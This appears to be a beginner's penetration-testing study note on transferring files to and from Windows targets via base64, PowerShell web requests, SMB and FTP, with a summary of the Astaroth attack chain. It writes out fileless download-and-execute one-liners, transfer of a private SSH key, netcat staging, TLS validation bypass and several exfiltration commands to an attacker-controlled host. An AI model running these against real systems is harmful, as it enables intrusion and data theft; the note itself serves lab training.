---
tags: [module/file-transfers, windows, powershell, smb, ftp, file-transfer, level/beginner]
---

# Windows File Transfer Methods - Beginner's Guide

## Why Windows File Transfers Matter

Windows is the most common target operating system in corporate environments. Understanding how to move files to and from Windows machines is essential for:

- Uploading privilege escalation tools
- Downloading proof-of-concept files
- Exfiltrating sensitive data
- Deploying persistence mechanisms

**The Rule:** If you can't move files, you can't escalate privileges.

---

## The Astaroth Attack - A Real-World Example

The Astaroth attack shows how attackers chain multiple file transfer methods:

1. **Spear-phishing email** with malicious link
2. **LNK file** executed when clicked
3. **WMIC tool** downloads JavaScript (using /Format parameter)
4. **JavaScript** downloads payloads using Bitsadmin
5. **Base64 encoding** with Certutil to decode
6. **DLL files** loaded with regsvr32
7. **Final payload** injected into Userinit process

**The Lesson:** Attackers use MULTIPLE file transfer methods to bypass defenses. You need to know them all.

---

## Download vs Upload

| Operation | Direction | Example |
|-----------|-----------|---------|
| Download | Target pulls file from you | Getting PowerView.ps1 onto victim |
| Upload | Target pushes file to you | Exfiltrating data to your machine |

---

## Method 1: Base64 Encoding

When network transfers are blocked, use text-only channels.

### Step 1: Encode on Linux (Your Machine)

md5sum id_rsa
cat id_rsa | base64 -w 0; echo

Copy the long base64 string.

### Step 2: Decode on Windows (Target)

[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64-STRING-HERE"))

### Step 3: Verify

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

The hash should match what you saw on Linux.

### Limitations

- cmd.exe max string length: 8,191 characters
- Web shells may choke on huge strings
- Not practical for large files

---

## Method 2: PowerShell Web Downloads

### DownloadFile (Saves to Disk)

(New-Object Net.WebClient).DownloadFile('https://url.com/file.ps1', 'C:\temp\file.ps1')

### DownloadString (Fileless - Memory Only)

IEX (New-Object Net.WebClient).DownloadString('https://url.com/script.ps1')

### Invoke-WebRequest (PowerShell 3.0+)

Invoke-WebRequest https://url.com/file.ps1 -OutFile file.ps1

### Aliases (Shorter)

iwr -uri https://url.com/file.ps1 -OutFile file.ps1

---

## Common PowerShell Errors

### Error: Internet Explorer First-Launch Configuration

Fix: Add -UseBasicParsing

Invoke-WebRequest https://url.com/file.ps1 -UseBasicParsing -OutFile file.ps1

### Error: SSL/TLS Trust Issue

Fix: Bypass certificate validation

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

---

## Method 3: SMB Downloads

SMB (port 445) is common in Windows networks.

### On Your Linux Machine (Server)

sudo impacket-smbserver share -smb2support /tmp/smbshare

### On Windows Target (Client)

copy \\YOUR-IP\share\nc.exe .

### If Guest Access Blocked

Add username/password:

sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

On Windows:

net use n: \\YOUR-IP\share /user:test test
copy n:\nc.exe .

---

## Method 4: FTP Downloads

### On Your Linux Machine (Server)

sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21

### On Windows Target (PowerShell)

(New-Object Net.WebClient).DownloadFile('ftp://YOUR-IP/file.txt', 'C:\temp\file.txt')

### On Windows Target (FTP Client - Non-Interactive)

Create command file:

echo open YOUR-IP > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.txt >> ftp.txt
echo bye >> ftp.txt

Run it:

ftp -v -n -s:ftp.txt

---

## Upload Operations

### Base64 Upload (Windows -> Linux)

On Windows (encode):

[Convert]::ToBase64String((Get-Content -path "C:\file.txt" -Encoding byte))

Copy the string, paste on Linux (decode):

echo "BASE64-STRING" | base64 -d > file.txt

### PowerShell Web Upload

Need a server that accepts uploads:

On Linux:

pip3 install uploadserver
python3 -m uploadserver

On Windows (download and use upload script):

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://YOUR-IP:8000/upload -File C:\file.txt

### FTP Upload

Start FTP server with write permissions:

sudo python3 -m pyftpdlib --port 21 --write

On Windows:

(New-Object Net.WebClient).UploadFile('ftp://YOUR-IP/file.txt', 'C:\file.txt')

Or using FTP client:

echo open YOUR-IP > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo PUT C:\file.txt >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt

---

## SMB Upload (Alternative)

If SMB outbound is allowed, you can also upload.

On Linux (server):

sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

On Windows (mount and copy):

net use n: \\YOUR-IP\share /user:test test
copy C:\file.txt n:\

---

## Method Comparison

| Method | Best For | Stealth | Speed |
|--------|----------|---------|-------|
| Base64 | Text-only channels | High | Slow |
| PowerShell HTTP | General use | Medium | Fast |
| SMB | Large files | Low (port 445) | Very Fast |
| FTP | Legacy systems | Medium | Fast |
| WebDAV | When SMB blocked | Medium | Fast |

---

## Key Takeaways

- Always have MULTIPLE methods ready
- Start with PowerShell web downloads
- Use Base64 when binary transfers fail
- SMB works great but may be blocked
- FTP is simple but often filtered
- Test what's allowed before committing
- Know both download AND upload techniques
- Document what works for future reference
- The Astaroth attack shows real-world chaining
- Practice ALL these methods in the lab
